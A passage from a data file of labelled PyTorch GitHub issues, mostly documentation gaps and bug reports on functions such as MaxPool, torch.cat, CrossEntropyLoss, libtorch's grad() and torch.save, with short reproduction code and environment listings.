py3.6_cuda10.1.243_cudnn7.6.3_0    pytorch\r\n[conda] torchvision               0.6.0                py36_cu101    pytorch\r\n[conda] torchviz                  0.0.1                    pypi_0    pypi\r\n\r\n\r\n\r\n\r\ncc @SsnL @VitalyFedyunin @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nDocumentation for [ConvTranspose1d layer](https://pytorch.org/docs/master/generated/torch.nn.ConvTranspose1d.html) does not contain even brief explanation of how channels are treated and how number of channels affect processing. \r\n\r\nSame goes for [Conv1d layer](https://pytorch.org/docs/master/generated/torch.nn.Conv1d.html) but it was at least covered in [this discussion](https://discuss.pytorch.org/t/understanding-convolution-1d-output-and-input/30764/2) and is somewhat more obvious. With transposed convolution it is easy to find dozens of sites, books and animations explainig how it happens but I have not found a single mention that happens when there is multiple input channels and how they are reduced to single output channel. There are several questions on discuss.pytorch.org which seem relevant:\r\n1. https://discuss.pytorch.org/t/how-to-use-torch-nn-convtranspose1d-to-take-the-derivative-of-torch-nn-conv1d-function/32620\r\n2.  https://discuss.pytorch.org/t/upsampling-convtranspose2d-getting-the-original-tensor-size/51936\r\n3.  https://discuss.pytorch.org/t/understanding-conv2d-and-convtranspose2d/42142\r\n4. https://discuss.pytorch.org/t/convtranspose2d-weight-shape/52528\r\n\r\nIn the end, I just created ConvTranspose1d layer, feed it with constant values and hypothesized that it:\r\n1. applies transposed convolution to each input channel independently\r\n2. sum results for each channels, adds bias and push it to output channel\r\n3. multiple output channels just use different set of kernels and produce different values\r\n\n\ncc @jlin27"},{"labels":[null,"documentation",null,null,null],"text":"## 🐛 Bug\r\n\r\nPer [documentation of MaxPool](https://pytorch.org/docs/stable/nn.html#maxpool2d), input is \"implicitly zero-padded on both sides for padding number of points.\" The implementation differs by implicitly padding with identity elements, rather than zero.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Create a tensor of signed type, filled with negative values.\r\n1. Invoke a MaxPool with positive padding.\r\n1. Compare against ground truth, either computed by hand or created by explicit zero-padding.\r\n\r\nMinimal code sample / unit test:\r\n```\r\n# Maxpool of non-positive values, such that padding is included in the computation of each result element.\r\nimport torch\r\nr = torch.nn.functional.max_pool2d(-torch.rand(2,2,64), kernel_size=[3,3], padding=1)\r\nassert torch.equal(r, torch.zeros_like(r))\r\n```\r\n\r\n## Expected behavior\r\n\r\nAccording to documentation, the values near the edge will be computed using the implicit zero-padding. The maximum of a negative number and zero is zero, so such values _ought_ to be zero. In the provided example, the assert should not fire.\r\n\r\nWhen the code sample above is run, however, the assert fires.\r\n\r\n## Environment\r\n\r\nInformation from collect_env.py:\r\n\r\n- PyTorch version: 1.5.1\r\n- Is debug build: No\r\n- CUDA used to build PyTorch: 10.2\r\n\r\n- OS: Microsoft Windows 10 Home\r\n- GCC version: (x86_64-win32-seh-rev0, Built by MinGW-W64 project) 8.1.0\r\n- CMake version: version 3.14.1\r\n\r\n- Python version: 3.8\r\n- Is CUDA available: Yes\r\n- CUDA runtime version: Could not collect\r\n- GPU models and configuration: GPU 0: GeForce GTX 960M\r\n- Nvidia driver version: 442.50\r\n- cuDNN version: Could not collect\r\n\r\n- Versions of relevant libraries:\r\n- [pip] Could not collect\r\n- [conda] Could not collect\r\n\r\n## Additional context\r\n\r\nN/A\n\ncc @ezyang @gchanan @zou3519 @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null],"text":"https://pytorch.org/docs/master/generated/torch.bmm.html#torch.bmm:\r\n`torch.bmm(input, mat2, deterministic=False, out=None) → Tensor`\r\n\r\n`mat2` is quite strange\r\n\r\nhttps://pytorch.org/docs/master/tensors.html?highlight=bmm#torch.Tensor.bmm:\r\n`bmm(batch2) → Tensor`\r\n\r\n`batch2` is strange as well (and does not even match torch.bmm)\r\n\r\nIt seems that it's a remnant of torch.addbmm, there batch1/batch2 make more sense. But combinations input/mat2 and self/batch2 don't make much sense\r\n\r\nSame for torch.mm/tensor.mm\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\ncompiling incorrectly fails with the error `error: passing ‘at::Tensor’ as ‘this’ argument discards qualifiers [-fpermissive]` (aka const correctness violated)\r\n\r\nThis follows the example from the docs (https://pytorch.org/cppdocs/api/classat_1_1_tensor.html#_CPPv4N2at6Tensor4gradEv)\r\n\r\n> `Tensor &grad()`\r\n> Return a mutable reference to the gradient. \r\n> This is conventionally used as `t.grad() = x` to set a gradient to a completely new tensor.\r\n\r\n> `void backward(...)`\r\n> ...\r\n> This function accumulates gradients in the leaves - you might need to zero them before calling it.\r\n\r\nbut fails to compile\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. call backward()\r\n2. set the grad to zero\r\n3. compile\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n```\r\n...error: passing ‘at::Tensor’ as ‘this’ argument discards qualifiers [-fpermissive]\r\n     z_grad = 0;\r\n              ^\r\n```\r\n```\r\n#include <torch/torch.h>                                                                                                                                                                                           \r\n#include <iostream>                                                                                                                                                                                                \r\n#include <vector>                                                                                                                                                                                                  \r\n                                                                                                                                                                                                                   torch::Device get_device()                                                                                                                                                                                         \r\n{                                                                                                                                                                                                                  \r\n    torch::Device device = torch::kCPU;                                                                                                                                                                            \r\n    if (torch::cuda::is_available()) {                                                                                                                                                                                     std::cout << \"CUDA is available! Training on GPU.\" << std::endl;                                                                                                                                           \r\n        device = torch::kCUDA;                                                                                                                                                                                     \r\n    }                                                                                                                                                                                                              \r\n    return device;                                                                                                                                                                                                 \r\n}                                                                                                                                                                                                                  \r\n                                                                                                                                                                                                                   \r\nint main() {                                                                                                                                                                                                       \r\n    using torch::Tensor;                                                                                                                                                                                           \r\n    auto device = get_device();                                                                                                                                                                                    \r\n    auto options =                                                                                                                                                                                                 \r\n        torch::TensorOptions()                                                                                                                                                                                     \r\n        .dtype(torch::kFloat32)                                                                                                                                                                                    \r\n        .layout(torch::kStrided)                                                                                                                                                                                   \r\n        .device(device)                                                                                                                                                                                            \r\n        .requires_grad(true);                                                                                                                                                                                      \r\n                                                                                                                                                                                                                                                                                                                                                              \r\n    std::vector<float> z_vec = {1,2,3};                                                                                                                                                                                                                                                                   \r\n    Tensor z = torch::from_blob(z_vec.data(), {z_vec.size()}).to(device);                                                                                                                                          \r\n                                                                                                                                                                                                                   \r\n    Tensor z_times_2 = 2 * z;                                                                                                                                                                                      \r\n    z_times_2.backward({}, true); // keep graph                                                                                                                                                                    \r\n    Tensor& z_grad = z.grad(); // mutable, non-const ref\r\n    std::cout << z << std::endl;                                                                                                                                                                                   \r\n    std::cout << z_grad << std::endl;                                                                                                                                                                              \r\n    z_grad = 0;                                                                                                                                                                                                    \r\n    std::cout << z_grad << std::endl;                                                                                                                                                                              \r\n}\r\n```\r\nfails to compile with the error above, identifying `z_grad = 0;` as the problem   \r\n\r\nExactly as used in the docs, `z.grad() = 0` does not work either.\r\n\r\nEven with const_cast, it still fails to compile.\r\n`const_cast<Tensor&>(z_grad) = 0; ` or alternatively `Tensor& z_grad = const_cast<Tensor&>(z.grad()); // mutable, non-const ref`\r\n\r\nPassing `-fpermissive` to the compiler does allow it to compile, but this should not be necessary\r\n\r\n## Expected behavior\r\n\r\nIt should compile and set the gradient to zero.\r\n\r\n## Environment\r\n\r\n - PyTorch Version (e.g., 1.0): libtorch 1.5.1(stable, linux, libtorch, C++/Java, CUDA 10.2) CXX11 ABI\r\n - OS (e.g., Linux): Linux, Ubuntu 18.04 LTS\r\n - How you installed PyTorch (`conda`, `pip`, source): the downloads page (https://pytorch.org/get-started/locally/) and linking against it (https://download.pytorch.org/libtorch/cu102/libtorch-cxx11-abi-shared-with-deps-1.5.1.zip)\r\n - Build command you used (if compiling from source): not compiled from source\r\n - Python version: irrelevant\r\n - CUDA/cuDNN version: (probably irrelevant) CUDA 10.2, cuDNN 7.6.5\r\n - GPU models and configuration: (probably irrelevant) Quadro P1000\r\n - Additional information: gcc 7.3 (`g++ (Ubuntu 7.3.0-16ubuntu3) 7.3.0`), cmake is pretty much exactly the minimal example here (https://pytorch.org/cppdocs/installing.html) but renamed and without MSVC\r\n\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen @jlin27"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/cppdocs/api/classat_1_1_tensor.html#_CPPv4NK2at6Tensor4itemEv\r\nand\r\nhttps://pytorch.org/cppdocs/api/classat_1_1_tensor.html#_CPPv4I0ENK2at6Tensor4itemE1Tv\r\n\r\nare both missing descriptions.\r\n\r\n--------\r\n\r\nI am trying to get a `float` out of a `Tensor` (that is a single element, kFloat32) on the GPU.\r\n\r\ne.g.\r\n`float x = x_tensor.item()`\r\nHowever, this gives a compile-time error:\r\n`error: cannot convert ‘c10::Scalar’ to ‘double’ in assignment`\r\n\r\nUsing `float x = x_tensor<float>.item()` compiles just fine, doesn't work either (program spins forever, probably waiting for CUDA kernel to end after a bad memory access or something).\r\n\r\nWhat is the proper way to get the float out of the tensor (and back into main memory)? It prints just fine, so it must be doable.\r\nI'd prefer to do it without printing and parsing or moving the entire tensor back to the CPU.\n\ncc @yf225 @glaringlee @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nFrom the module code overview page: https://pytorch.org/docs/master/_modules/ there are some modules whose source code documentation page isn't properly displaying and instead displays the \"*Oops! You've reached a dead end*\" page. \r\n\r\ne.g. \r\n\r\n* https://pytorch.org/docs/master/_modules/torch/__config__.html\r\n* https://pytorch.org/docs/master/_modules/torch/_jit_internal.html\r\n* https://pytorch.org/docs/master/_modules/torch/_lobpcg.html\r\n* https://pytorch.org/docs/master/_modules/torch/_lowrank.html\r\n* https://pytorch.org/docs/master/_modules/torch/jit/_script.html\r\n* https://pytorch.org/docs/master/_modules/torch/jit/_trace.html\r\n\r\nWhen I build the docs using a local copy of PyTorch however, the HTML files properly build for these pages. \r\n\r\ne.g. for `torch/__config__`\r\n\r\n**Locally built:**\r\n\r\n<img width=\"960\" alt=\"locally-built-pytorch-docs\" src=\"https://user-images.githubusercontent.com/54918401/86973415-85804600-c142-11ea-9358-2ebf95152bf8.png\">\r\n\r\n**Public page on PyTorch website:**\r\n\r\n<img width=\"1044\" alt=\"public-pytorch-docs\" src=\"https://user-images.githubusercontent.com/54918401/86973452-9335cb80-c142-11ea-8c88-0d39b1ba636c.png\">\r\n\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nIt looks as though the code is missing for the [Audio Classification Tutorial](https://pytorch.org/tutorials/beginner/audio_classifier_tutorial.html). I didn't see code in the html document or at the [linked GitHib url](https://github.com/pytorch/tutorials/blob/master/beginner_source/audio_classifier_tutorial.py).\r\n\r\nThis is what I see:\r\n\r\n<img width=\"1440\" alt=\"Screenshot 2020-07-08 at 7 57 09 AM\" src=\"https://user-images.githubusercontent.com/6405428/86857353-e7b05b00-c0f0-11ea-998a-845795efefb8.png\">\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\nAccording to the documentation, the signature of `torch.cat` is `torch.cat(tensors, dim=0, out=None)`. However, it is not possible to call `torch.cat` with three positional arguments.\r\n\r\n## To Reproduce\r\n\r\n```\r\n>>> torch.cat([torch.rand(1, 2, 3), torch.rand(1, 2, 3)], 0, torch.FloatTensor(12))\r\nTypeError: cat() received an invalid combination of arguments - got (list, int, Tensor), but expected one of:\r\n * (tuple of Tensors tensors, name dim, *, Tensor out)\r\n * (tuple of Tensors tensors, int dim, *, Tensor out)\r\n```\r\n\r\nThe following works though, notice that I only added `out=` to the third argument. However, this should not be required as per the signature definition in the documentation.\r\n\r\n```\r\n>>> torch.cat([torch.rand(1, 2, 3), torch.rand(1, 2, 3)], 0, out=torch.FloatTensor(12))\r\ntensor([[[0.6310, 0.3772, 0.7654],\r\n         [0.8126, 0.7031, 0.6288]],\r\n\r\n        [[0.3101, 0.7344, 0.5670],\r\n         [0.0366, 0.5181, 0.3637]]])\r\n```\r\n\r\n## Expected behavior\r\n\r\n`torch.cat` should be callable without having to use a named argument for `out`.\r\n\r\n## Environment\r\n\r\n```\r\nPyTorch version: 1.5.0+cu101\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Ubuntu 20.04 LTS\r\nGCC version: (Ubuntu 9.3.0-10ubuntu2) 9.3.0\r\nCMake version: version 3.16.3\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.1.243\r\nGPU models and configuration: GPU 0: GeForce GTX 1650\r\nNvidia driver version: 440.64\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.1\r\n[pip3] torch==1.5.0+cu101\r\n[pip3] torchvision==0.6.0+cu101\r\n[conda] numpy                     1.18.1                   pypi_0    pypi\r\n[conda] torch                     1.5.0+cu101              pypi_0    pypi\r\n[conda] torchvision               0.6.0+cu101              pypi_0    pypi\r\n```\n\ncc @jlin27"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\n*Note*: I'm linking 1.5.0, not 1.5.1, b/c I can't get a permalink to 1.5.1 docs :(\r\n\r\nI was trying to get familiar with how BatchNorm stuff works:\r\nhttps://pytorch.org/docs/1.5.0/nn.html?highlight=batchnorm#torch.nn.BatchNorm1d\r\nThe docs and paper xref were great! But I didn't have a good grasp of how the running estimates were actually implemented, so I looked at the code:\r\nhttps://github.com/pytorch/pytorch/blob/480851ad2c21e8e39e336d849b8030a2f91718d7/torch/nn/modules/batchnorm.py#L41-L54\r\n\r\nLooked pretty straightforward, and I learned what \"buffers\" are in this context for `pytorch`; however, I was wondering what this did to the registration of buffers / parameters.\r\n\r\nLooking at the docs for both `.register_parameter` and `.register_buffer`:\r\nhttps://pytorch.org/docs/1.5.0/nn.html#torch.nn.Module.register_buffer\r\nhttps://pytorch.org/docs/1.5.0/nn.html#torch.nn.Module.register_parameter\r\n\r\nI notice that there are kinda code paths for handling the `None` case, but it's not documented (at least not in this immediate area).\r\n\r\nFrom what it looks like, registering something with `None` is tantamount to just setting the attribute to `None` - there's no real exposure of the parameter to users...\r\n\r\n## Suggestion Solutions\r\n\r\n* Document this behavior in `.register_parameter` and `.register_buffer` - if you register a buffer / parameter with `None`, it's basically just gonna be ignored\r\n* Have some brief exposition defining the terms \"parameter\" and \"buffer\" next to each other, and mention the possible equivalence of `Parameter.requires_grad=False` to a registered buffer? AFAICT, this comparison is done kinda implicitly, e.g.:\r\n  * <https://pytorch.org/tutorials/beginner/saving_loading_models.html#what-is-a-state-dict>\r\n  * <https://pytorch.org/tutorials/recipes/recipes/what_is_state_dict.html> - smells like a copy of the first?\r\n\r\n## Related\r\n\r\n* #8104 - all the `None` stuff\r\n* #16675 - understandable about `register_buffers` looking like a hack... but I guess it's pretty well used?\r\n* #39670 - behavior for `jit`\r\n* (kinda meta) <https://discuss.pytorch.org/t/what-is-the-difference-between-register-buffer-and-register-parameter-of-nn-module/32723/10> - asked my question - why buffers instead of parameters, and equivalence\r\n* #2018 - most recent PR that mentions `register_buffer` (Sep. 2017)\r\n* 7f4ff0e615e - introduction of the `Module.register_buffer` in Sep. 2016, I guess to help w/ impl. of `BatchNorm`\r\n\r\n## Example\r\n\r\nUsing Torch 1.5.1:\r\n```py\r\nfrom pprint import pformat\r\n\r\nimport torch.nn as nn\r\n\r\ndef show(code):\r\n    module = eval(code)\r\n    print(f\">>> {code}\")\r\n    print()\r\n    print(f\"state_dict:\\n{pformat(module.state_dict())}\\n\")\r\n    print(f\"parameters:\\n{pformat(list(module.named_parameters()))}\\n\")\r\n    print(f\"buffers:\\n{pformat(list(module.named_buffers()))}\\n\")\r\n    print(\"---\")\r\n\r\n# Everything.\r\nshow('nn.BatchNorm1d(1)')\r\n\r\n# No parameters.\r\nshow('nn.BatchNorm1d(1, affine=False)')\r\n\r\n# No buffers.\r\nshow('nn.BatchNorm1d(1, track_running_stats=False)')\r\n```\r\n\r\nOutput:\r\n```\r\n>>> nn.BatchNorm1d(1)\r\n\r\nstate_dict:\r\nOrderedDict([('weight', tensor([1.])),\r\n             ('bias', tensor([0.])),\r\n             ('running_mean', tensor([0.])),\r\n             ('running_var', tensor([1.])),\r\n             ('num_batches_tracked', tensor(0))])\r\n\r\nparameters:\r\n[('weight', Parameter containing:\r\ntensor([1.], requires_grad=True)),\r\n ('bias', Parameter containing:\r\ntensor([0.], requires_grad=True))]\r\n\r\nbuffers:\r\n[('running_mean', tensor([0.])),\r\n ('running_var', tensor([1.])),\r\n ('num_batches_tracked', tensor(0))]\r\n\r\n---\r\n>>> nn.BatchNorm1d(1, affine=False)\r\n\r\nstate_dict:\r\nOrderedDict([('running_mean', tensor([0.])),\r\n             ('running_var', tensor([1.])),\r\n             ('num_batches_tracked', tensor(0))])\r\n\r\nparameters:\r\n[]\r\n\r\nbuffers:\r\n[('running_mean', tensor([0.])),\r\n ('running_var', tensor([1.])),\r\n ('num_batches_tracked', tensor(0))]\r\n\r\n---\r\n>>> nn.BatchNorm1d(1, track_running_stats=False)\r\n\r\nstate_dict:\r\nOrderedDict([('weight', tensor([1.])), ('bias', tensor([0.]))])\r\n\r\nparameters:\r\n[('weight', Parameter containing:\r\ntensor([1.], requires_grad=True)),\r\n ('bias', Parameter containing:\r\ntensor([0.], requires_grad=True))]\r\n\r\nbuffers:\r\n[]\r\n\r\n---\r\n```\r\n\r\ncc @jlin27 @albanD @mruberry"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\nTorch 1.5.0 CPU, Linux\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nhttps://github.com/pytorch/pytorch/blob/master/torch/optim/lr_scheduler.py#L448\r\n\r\nBug API: `torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max, eta_min=0, last_epoch=-1)`\r\n\r\nIf set T_max =5, initial learning_rate of optimizer are 0.5, eta_min=0:\r\n\r\nThe value calculated by framework are as flow :\r\n![image](https://user-images.githubusercontent.com/52485244/86489498-16e46680-bd97-11ea-9a10-622d48d4cf3e.png)\r\n\r\nBut the value calculated by formula in the document are as flow：\r\nhttps://pytorch.org/docs/stable/optim.html?highlight=cosineannealinglr#torch.optim.lr_scheduler.CosineAnnealingLR\r\n![image](https://user-images.githubusercontent.com/52485244/86489333-a2112c80-bd96-11ea-8e01-19fa5ae1227a.png)\r\n\r\nThese Two doesn't match, in epoch 5. one is 0, but the other is 0.0954915028125. I want to know which one is right, thank you very much!\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## 🚀 Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\nA graphs page on site, to track the evolution of PyTorch, along with the time required to train neural networks, along with the data available.\r\n## Motivation\r\n\r\n<!-- Please outline the motivation for the proposal. Is your feature request related to a problem? e.g., I'm always frustrated when [...]. If this is related to another GitHub issue, please link here too -->\r\nWithout graph it become difficult to see, where things are headed.\r\n## Pitch\r\n\r\n<!-- A clear and concise description of what you want to happen. -->\r\nI suggest a few graphs, a few more could be added,\r\n1) Evolution of PyTorch\r\n2) Evolution of time required to train neural network, since the beginning of PyTorch\r\n3) Evolution of data available since the beginning of PyTorch in terms of size\r\n4) Evolution of number of parameters in neural network\r\n5) Evolution of FLOPS\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## 🐛 Bug\r\n\r\nWhen we pass a list of parameters or parameter groups to an optimizer, and one parameter appears multiple times we get different behaviours, and it is not clear whether this is intended that way:\r\n\r\n* If the parameter appears twice within one parameter group, everything works. That parameter will get updated *twice* though.\r\n* If the parameter appears in distinct parameter groups, then we get an error.\r\n\r\n## To Reproduce\r\n\r\n```\r\nimport torch\r\nx = torch.zeros((1,), requires_grad=True)\r\n# uncomment one of the following three lines for each of the cases:\r\n# a = torch.optim.SGD(params=[dict(params=[x])], lr=0.1) # baseline\r\n# a = torch.optim.SGD(params=[dict(params=[x, x])], lr=0.1)  # apparently acceptable (?); x is updated twice\r\n# a = torch.optim.SGD(params=[dict(params=x), dict(params=x)], lr=0.1)  # apparently not acceptable\r\nx.sum().backward()\r\na.step()\r\nprint(x)\r\n```\r\n\r\n## Expected behavior\r\n\r\nI would expect that no matter in what way a parameter apperas multiple times, we get the same behaviour in both situations: Either we get errors in both situations, or both situations are deemed acceptable.\r\n\r\n## Environment\r\n\r\n - PyTorch Version (e.g., 1.0): 1.5\r\n - OS (e.g., Linux): Win/Linux\r\n - How you installed PyTorch: conda\r\n - Python version: 3.7\r\n\r\n\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nThe link to [\"PyTorch\" organization on GitHub](https://github.com/orgs/pytorch/teams/facebook) seems to be broken, when accessed from PyTorch Governance (both on the [master version](https://pytorch.org/docs/master/community/governance.html#core-developers) and the [stable version](https://pytorch.org/docs/stable/community/governance.html#core-developers)).\r\n\r\nIt does not work even on [Github source code of pages](https://github.com/pytorch/pytorch/blob/master/docs/source/community/governance.rst#core-developers).\r\n\r\nIs this an old link? What should we replace it with?\n\ncc @jlin27"},{"labels":["documentation",null],"text":"PyTorch has accumulated a lot of lingo that are fuzzily-defined. Need a glossary table that gives a clear definition to commonly used terms to facilitate discussion and communication. \n\ncc @jlin27"},{"labels":[null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nHi, during training, I noticed that when specifiying weights for CrossEntropyLoss, using the 'mean' reduction produces a different loss output, compared to using the 'none' reduction and computing the mean manually.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```\r\nimport torch\r\nimport torch.nn as nn\r\n\r\nlogits = torch.randn((16, 5))\r\ntargets = torch.empty(16, dtype=torch.long).random_(5)\r\n\r\nweights = [1, 2, 3, 4, 5]\r\ncross_ent_mean = nn.CrossEntropyLoss(weight=torch.FloatTensor(weights), reduction='mean')\r\nloss_a = cross_ent_mean(logits, targets)\r\nprint(loss_a)\r\n\r\ncross_ent = nn.CrossEntropyLoss(weight=torch.FloatTensor(weights), reduction='none')\r\nloss_b = cross_ent(logits, targets).mean()\r\nprint(loss_b)\r\n\r\nassert torch.equal(loss_a, loss_b)\r\n```\r\n\r\n## Expected behavior\r\n\r\nThe loss computed by the two methods should be equal `torch.equal(loss_a, loss_b) = True`\r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0): 1.6.0.dev20200505+cu101\r\n - OS (e.g., Linux): Windows 10\r\n - How you installed PyTorch (`conda`, `pip`, source): pip\r\n - Build command you used (if compiling from source):\r\n - Python version: 3.7.6\r\n - CUDA/cuDNN version: CUDA 10.1 (irrelevant)\r\n - GPU models and configuration: GTX970M (irrelevant)\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\nIt seems to be the problem with the weights as I tried out to assign the same weight to all the classes, however, theorectically, the weighted loss should be computed before applying the mean() operation.\n\ncc @ezyang @gchanan @zou3519 @jlin27 @albanD @mruberry"},{"labels":["documentation",null,null],"text":"This function has an input parameter add_histogram(), what does it mean? There is no documentation about this parameter. \r\n\r\nDocumentation link \r\nhttps://pytorch.org/docs/stable/tensorboard.html#torch.utils.tensorboard.writer.SummaryWriter.add_histogram\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\n[https://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_normal_](https://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_normal_)\r\n\r\n[https://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_uniform_](https://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_uniform_)\r\n\r\n#### API\r\n\r\n`torch.nn.init.kaiming_uniform_` \r\n\r\n`torch.nn.init.kaiming_normal_`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input :\r\n\r\n**with 'leaky_relu')** (*used*) –\r\n\r\nwhich should be part of the description for input argument `a`\n\ncc @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/cuda.html#torch.cuda.set_rng_state_all\r\n\r\n#### API\r\n\r\n`torch.utils.checkpoint.checkpoint_sequential`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input ` new_state`, but it is not in the signature, and it is not accepted by the function. It should be `new_states`\r\n\r\nRunning code :\r\n\r\n~~~python\r\ntorch.cuda.set_rng_state_all(new_state=(torch.ByteTensor(1)))\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTypeError: set_rng_state_all() got an unexpected keyword argument 'new_state'\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version:  1.5.0\r\n- Python version: 3.8.2\r\n\r\ncc @ngimel @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThe current documentation says it's an \"ordered dictionary that respects the order of insertion\", but it can, in fact, destroy its order. For example: \r\n\r\n![image](https://user-images.githubusercontent.com/38511765/85050917-aeb54400-b14b-11ea-9e61-5aa455df6019.png)\r\n\r\nWe should update our documentation to clarify its behavior, especially as users might try to enumerate the dict sequentially. \r\n\n\ncc @jlin27 @albanD @mruberry"},{"labels":[null,null,"documentation",null,null],"text":"##  📚 Documentation\r\ntorch==1.5.0\r\n\r\nThe problem is the same for all three functions. For example, let's consider [no_grad](https://pytorch.org/docs/stable/autograd.html#torch.autograd.no_grad).\r\n\r\nThe documentation says: \"This mode has no effect when using `enable_grad` context manager\". This is not true:\r\n```python\r\nimport torch\r\nx = torch.tensor([1.0], requires_grad=True)\r\nwith torch.enable_grad():\r\n    with torch.no_grad():\r\n        y = x * 2\r\nassert not y.requires_grad\r\n```\r\n\r\nAnd I mean that the documentation should be fixed, not the behavior of `torch` 😄 \r\nThese functions just set grad enabled/disabled in `__enter__` (or in the constructor in the case of `set_grad_enabled`) and set the _previous_ state in `__exit__`. This is very intuitive. IMHO, it will be confusing if, for example, the behavior of `no_grad` changes depending on some other context.\n\ncc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen @jlin27"},{"labels":[null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nCalling `torch.save` on a sliced tensor seems to write the entire unsliced tensor to disk.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n```\r\nimport torch\r\n\r\narray = torch.zeros(1000000)\r\nslice = array[:1000]\r\nclone = slice.clone()\r\n\r\ntorch.save(array, 'array.pt') # 3.9MB on disk\r\ntorch.save(slice, 'slice.pt') # 3.9MB on disk\r\ntorch.save(clone, 'clone.pt') # 4.3KB on disk\r\n```\r\n\r\n## Expected behavior\r\n\r\n`torch.save` only writes the bytes to disk that are part of the slice. The file-sizes of `slice.pt` and `clone.pt` in the above example should be equal.\r\n\r\n## Environment\r\n```\r\nPyTorch version: 1.5.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.2\r\n\r\nOS: Arch Linux\r\nGCC version: (GCC) 10.1.0\r\nCMake version: version 3.17.3\r\n\r\nPython version: 3.8\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.2.89\r\nGPU models and configuration: GPU 0: GeForce RTX 2060 SUPER\r\nNvidia driver version: 440.82\r\ncuDNN version: /usr/lib/libcudnn.so.7.6.5\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.5\r\n[pip3] torch==1.5.0\r\n[pip3] torchsummary==1.5.1\r\n[conda] Could not collect\r\n```\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nPR gh-37419 refactored the content of `docs/source/rpc/index.rst` into `docs/source/rpc.rst` but did not link to the latter from `doc/source/index.rst` so the top-level RPC documentation is missing from https://pytorch.org/docs/master/.\r\n\r\nThis should be fixed before the next release. I think it should be enough to replace `rpc/index.rst` with `rpc` on [`docs/source/index.rst`](https://github.com/pytorch/pytorch/blob/master/docs/source/index.rst) and make sure the top-level page is then visible.\r\n\r\nnoticed by @mrshenli \n\ncc @jlin27 @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nWhen it comes to parameter `dim` in `torch.norm`, the documentation says\r\n```\r\ndim (int, 2-tuple of python:ints, 2-list of python:ints, optional) – \r\nIf it is an int, vector norm will be calculated, if it is 2-tuple of ints,\r\nmatrix norm will 